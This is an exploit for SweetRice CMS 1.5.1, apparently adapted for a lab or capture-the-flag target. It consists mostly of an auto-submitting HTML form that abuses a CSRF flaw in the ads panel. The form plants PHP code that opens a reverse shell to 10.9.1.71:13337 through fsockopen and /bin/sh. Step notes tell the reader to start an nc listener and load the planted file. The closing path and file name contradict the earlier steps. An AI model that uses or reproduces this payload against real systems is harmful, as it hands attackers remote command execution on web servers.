<!--
# Exploit Title: SweetRice 1.5.1 Arbitrary Code Execution
# Date: 30-11-2016
# Exploit Author: Ashiyane Digital Security Team
# Vendor Homepage: http://www.basic-cms.org/
# Software Link: http://www.basic-cms.org/attachment/sweetrice-1.5.1.zip
# Version: 1.5.1


# Description :

# In SweetRice CMS Panel In Adding Ads Section SweetRice Allow To Admin Add
PHP Codes In Ads File
# A CSRF Vulnerabilty In Adding Ads Section Allow To Attacker To Execute
PHP Codes On Server .
# In This Exploit I Just Added a echo '<h1> Hacked </h1>'; phpinfo(); 
Code You Can
Customize Exploit For Your Self .

# Ice1187:
	1. Add a ads in the admin panel with following html content and name hack
	2. Setup nc listen port 13337
	3. Visit http://ip/content/inc/ads/hack.php
	4. Get shell

# Exploit :
-->

<html>
<body onload="document.exploit.submit();">
<form action="http://10.10.6.211/content/as/?type=ad&mode=save" method="POST" name="exploit">
<input type="hidden" name="adk" value="rev"/>
<textarea type="hidden" name="adv">
<?php
echo '<h1> Hacked </h1>';
$sock=fsockopen("10.9.1.71",13337);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);
phpinfo();?>
&lt;/textarea&gt;
</form>
</body>
</html>

<!--
# After HTML File Executed You Can Access Page In
http://localhost/sweetrice/inc/ads/hacked.php
  -->
